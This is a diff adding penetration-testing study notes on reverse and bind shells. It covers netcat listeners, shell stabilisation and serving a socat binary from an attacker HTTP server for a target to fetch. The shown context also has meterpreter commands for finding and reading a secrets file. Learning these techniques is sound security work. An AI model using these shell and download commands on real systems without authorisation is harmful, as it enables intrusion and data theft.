@@ -867,7 +867,7 @@ How to choose version:
 - ``` meterpreter > search -f secrets.txt ```
 - ``` meterpreter > cat "{file_path}" ```
 
-## What the Shell?
+## Shell
 
 **tool: set up listener**
 - Netcat, Socat, Metasploit -- multi/handler,
@@ -888,4 +888,34 @@ Bind shell.
 
 **interactive or non-interactive**
 - interactive: allow you to interact with programs after executing them.
-- 
+- Non-Interactive: 
+
+**Netcat**
+- ``` nc -lvnp <port-number> ``` start listener of reverse shell
+- ``` nc <target-ip> <chosen-port> ``` obtain bind shell
+
+**Netcat Shell Stabilisation**
+Technique 1: Python
+- ``` python -c 'import pty;pty.spawn("/bin/bash")' ``` spawn a better featured bash shell
+- ``` export TERM=xterm ``` able to use commands like ``` clear ```
+- ``` stty raw -echo; fg ``` 
+- ![image](https://user-images.githubusercontent.com/91292763/148204472-f50d32d6-1821-404e-8da6-beaede32a2d4.png)
+
+Technique 2: rlwrap
+- gives us access to history, tab autocompletion and the arrow keys
+- ``` sudo apt install rlwrap ``` 
+- ``` rlwrap nc -lvnp <port> ``` start listener
+- ``` stty raw -echo; fg ```
+
+Technique 3: Socat
+- socat static compiled binary (a version of the program compiled to have no dependencies)
+- ``` sudo python3 -m http.server 80 ```
+- ``` wget <LOCAL-IP>/socat -O /tmp/socat ```
+- ``` Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe ```
+
+change your terminal tty size:
+- ``` stty -a ```
+- ``` stty rows <number> ```
+- ``` stty cols <number> ```
+
+
